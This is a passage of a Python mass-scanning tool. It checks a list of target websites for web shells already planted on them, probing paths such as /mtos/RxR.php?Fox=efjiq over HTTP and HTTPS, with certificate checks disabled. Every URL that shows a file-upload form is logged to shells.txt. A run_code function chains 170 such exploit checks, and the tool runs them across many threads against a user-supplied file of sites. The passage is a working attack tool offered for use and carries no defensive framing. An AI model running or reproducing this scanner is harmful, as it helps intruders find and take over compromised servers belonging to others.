                print (' [#] Exploit 168 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/mtos/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/mtos/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 168 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/mtos/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 168 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_169(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 169 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/mt/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 169 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/mt/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 169 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_170(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/MT/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 170 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/MT/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/MT/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 170 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/MT/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 170 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#





#funtion pool ha ha
def run_code(site):
    try:
        
        exploit_1(site)
        exploit_2(site)
        exploit_3(site) 
        exploit_4(site)
        exploit_5(site)
        exploit_6(site)
        exploit_7(site)
        exploit_8(site)
        exploit_9(site) 
        exploit_11(site)
        exploit_12(site)
        exploit_13(site)
        exploit_14(site)
        exploit_15(site)
        exploit_16(site)
        exploit_17(site)
        exploit_18(site)
        exploit_19(site)
        exploit_20(site)
        exploit_21(site)
        exploit_22(site)
        exploit_23(site)
        exploit_24(site)
        exploit_25(site)
        exploit_26(site)
        exploit_27(site)
        exploit_28(site)
        exploit_29(site)
        exploit_30(site)
        exploit_31(site)
        exploit_32(site)
        exploit_33(site)
        exploit_34(site)
        exploit_35(site)
        exploit_36(site)
        exploit_37(site)
        exploit_38(site)
        exploit_39(site)
        exploit_40(site)
        exploit_41(site)
        exploit_42(site)
        exploit_43(site)
        exploit_44(site)
        exploit_45(site)
        exploit_46(site)
        exploit_47(site)
        exploit_48(site)
        exploit_49(site)
        exploit_50(site)
        exploit_51(site)
        exploit_52(site)
        exploit_53(site)
        exploit_54(site)
        exploit_55(site)
        exploit_56(site)
        exploit_57(site)
        exploit_58(site)
        exploit_59(site)
        exploit_60(site)
        exploit_61(site)
        exploit_62(site)
        exploit_63(site)
        exploit_64(site)
        exploit_65(site)
        exploit_66(site)
        exploit_67(site)
        exploit_68(site)
        exploit_69(site)
        exploit_70(site)
        exploit_71(site)
        exploit_72(site)
        exploit_73(site)
        exploit_74(site)
        exploit_75(site)
        exploit_76(site)
        exploit_77(site)
        exploit_78(site)
        exploit_79(site)
        exploit_80(site)
        exploit_81(site)
        exploit_82(site)
        exploit_83(site)
        exploit_84(site)
        exploit_85(site)
        exploit_86(site)
        exploit_87(site)
        exploit_88(site)
        exploit_89(site)
        exploit_90(site)
        exploit_91(site)
        exploit_92(site)
        exploit_93(site)
        exploit_94(site)
        exploit_95(site)
        exploit_96(site)
        exploit_97(site)
        exploit_98(site)
        exploit_99(site)
        exploit_100(site)
        exploit_101(site)
        exploit_102(site)
        exploit_103(site)
        exploit_104(site)
        exploit_105(site)
        exploit_106(site)
        exploit_107(site)
        exploit_108(site)
        exploit_109(site)
        exploit_110(site)
        exploit_111(site)
        exploit_112(site)
        exploit_113(site)
        exploit_114(site)
        exploit_115(site)
        exploit_116(site)
        exploit_117(site)
        exploit_118(site)
        exploit_119(site)
        exploit_120(site)
        exploit_121(site)
        exploit_122(site)
        exploit_123(site)
        exploit_124(site)
        exploit_125(site)
        exploit_126(site)
        exploit_127(site)
        exploit_128(site)
        exploit_129(site)
        exploit_130(site)
        exploit_131(site)
        exploit_132(site)
        exploit_133(site)
        exploit_134(site)
        exploit_135(site)
        exploit_136(site)
        exploit_137(site)
        exploit_138(site)
        exploit_139(site)
        exploit_140(site)
        exploit_141(site)
        exploit_142(site)
        exploit_143(site)
        exploit_144(site)
        exploit_145(site)
        exploit_146(site)
        exploit_147(site)
        exploit_148(site)
        exploit_149(site)
        exploit_150(site)
        exploit_151(site)
        exploit_152(site)
        exploit_153(site)
        exploit_154(site)
        exploit_155(site)
        exploit_156(site)
        exploit_157(site)
        exploit_158(site)
        exploit_159(site)
        exploit_160(site)
        exploit_161(site)
        exploit_162(site)
        exploit_163(site)
        exploit_164(site)
        exploit_165(site)
        exploit_166(site)
        exploit_167(site)
        exploit_168(site)
        exploit_169(site)
        exploit_170(site)
        
        
        
    except:
        pass


# #
# #call me h0rn3t sp1d3rs 
# mp = Pool(poolAmount)

# # call the function 
# mp.map(run_code, target)
 

# mp.close()
# mp.join()
filename = input("\033[1;31mENTER FILE NAME: ")
# file = open(filename).read().split()
file = open(filename, encoding="utf-8").read().split()

myfile = set(file)
thread = int(input("\033[1;31mThreads: "))

# Create a thread pool with a maximum of 10 threads
with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
    # Submit each URL to the thread pool
    futures = [executor.submit(run_code, site) for site in myfile]

    # Wait for all threads to complete
    concurrent.futures.wait(futures)